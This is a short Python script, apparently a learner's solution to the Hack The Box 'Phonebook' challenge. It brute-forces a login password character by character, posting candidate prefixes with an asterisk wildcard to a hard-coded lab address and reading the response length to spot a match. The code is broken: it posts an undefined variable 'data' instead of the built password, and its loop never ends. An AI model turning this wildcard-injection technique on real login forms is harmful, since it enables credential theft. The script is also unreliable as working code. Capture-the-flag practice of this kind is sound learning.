#this script is for the htb challenge phonebook
#it tries to guess the correct password using astericks
#please do not religiously follow my comments, I was trying to make sense of the code for me

import requests
from string import ascii_lowercase, ascii_uppercase

url = 'http://138.68.156.206:32567/login' #insert your url here
headers = {'Host': '138.68.156.206:32567', #use burp to grab this header
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '29',
'Connection': 'close'}

chars = ascii_lowercase + ascii_uppercase + '0123456789_{}()' #we want to go through the whole alphabet and numbers
passwd = '' 

while(1):
        for char in chars:
                tmp = passwd + char + '*' #create a temp password
                r = requests.post(url, headers=headers, data=data) #and post

                if r.headers['Content-Length'] == '2586': #if it returs a certain length it means that character is part of the password
                        passwd += char
                elif char==')':
                        print (passwd)
                        break

print (passwd)


